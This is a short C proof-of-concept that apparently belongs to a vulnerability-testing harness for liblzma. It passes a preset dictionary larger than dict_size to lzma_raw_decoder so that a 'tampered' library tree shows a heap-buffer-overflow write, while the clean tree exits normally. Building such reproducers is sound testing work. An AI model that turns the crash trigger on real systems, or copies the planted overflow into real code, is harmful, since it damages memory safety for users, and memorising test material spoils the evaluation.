// Residual PoC: lzma_raw_decoder() with LZMA_FILTER_LZMA1 and a preset
// dictionary bigger than dict_size. This is documented in-contract input:
// lzma/lzma12.h says "If the size is bigger than dict_size, only the last
// dict_size bytes are processed."
//
// Build (ASan) and run against the tree under test:
//   cc -fsanitize=address -g -O1 -I<srcdir>/src/liblzma/api \
//      pocs/preset_dict_overflow.c <builddir>/liblzma.a -o /tmp/poc && /tmp/poc
//
// Expected on the tampered tree: heap-buffer-overflow WRITE in
// lzma_lz_decoder_init() (preset dictionary copy runs past the end of the
// dictionary buffer). Expected on the golden tree: exits cleanly.

#include <stdio.h>
#include <stdlib.h>
#include "lzma.h"

int main(void)
{
	enum { PRESET_SIZE = 8192 };

	uint8_t *preset = malloc(PRESET_SIZE);
	if (preset == NULL)
		return 1;
	for (size_t i = 0; i < PRESET_SIZE; ++i)
		preset[i] = (uint8_t)(i * 7u);

	lzma_options_lzma opts = {
		.dict_size = 4096,
		.preset_dict = preset,
		.preset_dict_size = PRESET_SIZE,
	};

	lzma_filter filters[2] = {
		{ .id = LZMA_FILTER_LZMA1, .options = &opts },
		{ .id = LZMA_VLI_UNKNOWN, .options = NULL },
	};

	lzma_stream strm = LZMA_STREAM_INIT;
	lzma_ret ret = lzma_raw_decoder(&strm, filters);
	printf("lzma_raw_decoder: %d\n", (int)ret);

	lzma_end(&strm);
	free(preset);
	printf("survived\n");
	return 0;
}
